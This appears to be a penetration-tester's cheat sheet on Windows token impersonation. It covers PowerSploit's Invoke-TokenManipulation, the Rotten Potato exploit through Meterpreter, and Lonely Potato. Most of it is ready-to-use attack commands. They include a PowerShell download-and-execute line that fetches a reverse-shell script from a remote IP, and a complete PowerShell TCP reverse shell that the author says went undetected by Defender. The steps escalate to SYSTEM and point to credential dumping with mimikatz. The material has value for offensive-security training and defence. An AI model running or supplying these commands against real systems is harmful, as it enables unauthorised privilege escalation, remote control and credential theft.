# Token Impersonation

Token impersonation is a technique you can use as local admin to impersonate another user logged on to a system. This is very useful in scenarios where you are local admin on a machine and want to impersonate another logged on user, e.g a domain administrator.

#### Powershell

We can do token impersonation directly in powershell with a completely legitimate module. This will spawn a new thread as the user you impersonation, but it can be made to work in the same thread. Therefore, if you impersonate and then type whoami it might still show the original username, but you still have privs as your target user. If you do however spawn a new process \(or a new shell\) and migrate to that you will have a shell as the account you are impersonating.

Token impersonation is now a part of Powersploit [https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)

Invokes token impersonation as a domain user. If this doesn't work you can try impersonating SYSTEM and then dumping credentials using mimikatz.

`Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"`

`Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`

`Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`

As a replacement for the last command you could do, but be vary of special characters in the command like `"` and `'` `Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"`

## Rotten potato exploit

The rotten potato exploit is a privilege escalation technique that allows escalation from service level accounts to SYSTEM through token impersonation. This can be achieved through uploading an exe file exploit and executing or through memory injection with psinject in either Empire or Metasploit. See [Foxglove security's writeup](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) of the exploit for more detail.

#### Meterpreter

Get a meterpreter shell as a service account and upload rot.exe to the box.

`getuid` - shows who you are, like `whoami` `getprivs` - shows you available tokens for impersonation `getsystem` - allows SYSTEM token impersonation directly in meterpreter if local admin `use incognito` - loads an extension that allows token impersonation `list_tokens -u` - lists available impersonation and delegation tokens

Now this is not very nice, but upload the exploit to disk Now you can use meterpreter's feature of executing binaries straight into memory and if that doesn't work upload it to disk as a dll and use rundll32 to execute it.

`execute -H -c -m -d calc.exe -f /root/rot.exe` `upload rot.dll "c:\temp\rot.dll"` `execute -H -c -f "rundll32 c:\temp\rot.dll,Main` Now do `list_tokens -u` again, and an impersonation token for SYSTEM should be available. You can then impersonate using `impersonate_token "NT AUTHORITY\SYSTEM"`

Congratulations, you are now system

### Lonely potato

[https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/) [https://github.com/decoder-it/lonelypotato](https://github.com/decoder-it/lonelypotato)

I did this on Windows 10 with Defender and nothing triggered. You could probably implement a better obfuscated reverse shell if you like.

Make a powershell reverse shell and put it in a file `test.bat`.

```text
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.9',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Upload it to the target machine on `c:\windows\temp\test.bat`. The directory doesn't really matter, this is just an example.

Upload MSFRottenPotato.exe to your target machine. Now depending on what token privs you have you can use this exploit. So enumerate your token privs with:

`whoami /priv`

If you only have `SeImpersonatePrivilege` you can use the `CreateProcesAsUser, (t)` argument. If you have both `SeImpersonatePrivilege` and `SeAssignPrimaryToken` you can use `CreateProcessWithTokenW, (*)` argument.

Set up your listener in empire, metasploit, netcat or whatever you prefer.

Execute it with

```text
c:\windows\temp\MSFRottenPotato.exe t c:\windows\temp\test.bat
 `
```

